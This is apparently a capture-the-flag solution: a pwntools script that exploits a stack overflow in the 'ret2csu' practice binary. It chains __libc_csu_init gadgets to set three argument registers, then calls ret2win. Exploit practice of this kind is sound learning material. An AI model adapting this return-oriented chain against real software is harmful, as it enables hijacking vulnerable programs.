#!/usr/bin/env python
from pwn import *

#setup pwntools to work with binary
elf = context.binary = ELF('ret2csu')
# io = gdb.debug(elf.path)
io = process(elf.path)

# goal: need to pop rdi, rsi and rdx, pass the three arguments and call ret2win
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

#memory addresses
ret2win_plt = 0x400510
csu_movcall = 0x0000000000400680
pop_rbx_rbp_r12_r13_r14_r15 = 0x000000000040069a
pop_rdi = 0x00000000004006a3

rop = b""
# preparing for csu call, rbp = 0x1 rbx = 0x0 must be set
rop += p64(pop_rbx_rbp_r12_r13_r14_r15)
rop += p64(0x3) # rbx = 3
rop += p64(0x4) # rbp = 4 -> for cmp
rop += p64(0x600e30) # r12 = addr of fini in .dynamic -> doesnt do anything
rop += p64(arg1) # r13 = arg1
rop += p64(arg2) # r14 = arg2
rop += p64(arg3) # r15 = arg3

rop += p64(csu_movcall)
rop += p64(0) * 7

rop += p64(pop_rdi) # fixing rdi as csu call only assignes half string
rop += p64(arg1)

rop += p64(ret2win_plt) # final ret2win call

payload = fit({40:rop})

# sending payload
io.recvuntil('> ')
io.sendline(payload)
io.interactive()
